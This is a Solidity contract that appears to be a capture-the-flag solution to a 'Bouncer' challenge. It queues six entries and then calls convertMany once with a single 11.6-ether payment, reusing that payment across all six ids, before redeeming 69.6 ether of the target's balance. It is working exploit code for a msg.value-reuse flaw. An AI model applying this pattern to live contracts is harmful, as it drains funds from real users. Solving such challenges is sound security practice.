pragma solidity 0.8.0;

import "public/Setup.sol";

contract Exploit {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    Bouncer _bouncer;

    constructor(Setup setup) payable {
        _bouncer = setup.bouncer();
        _bouncer.enter{value: 1 ether}(ETH, 11600000000000000000); // 11.6 ether
        _bouncer.enter{value: 1 ether}(ETH, 11600000000000000000);
        _bouncer.enter{value: 1 ether}(ETH, 11600000000000000000);
        _bouncer.enter{value: 1 ether}(ETH, 11600000000000000000);
        _bouncer.enter{value: 1 ether}(ETH, 11600000000000000000);
        _bouncer.enter{value: 1 ether}(ETH, 11600000000000000000);
    }

    function exploit() public payable {
        uint256[] memory ids = new uint256[](6);
        ids[0] = 0;
        ids[1] = 1;
        ids[2] = 2;
        ids[3] = 3;
        ids[4] = 4;
        ids[5] = 5;
        _bouncer.convertMany{value: 11600000000000000000}(address(this), ids);
        _bouncer.redeem(ERC20Like(ETH), 69600000000000000000);
    }

    //  for debug
    function viewBouncerBalance() public view returns(uint) {
        return address(_bouncer).balance;
    }

    //  for debug
    function viewBalance() public view returns(uint) {
        return _bouncer.tokens(address(this), ETH);
    }

    // to make it receivable
    receive() external payable {

    }
}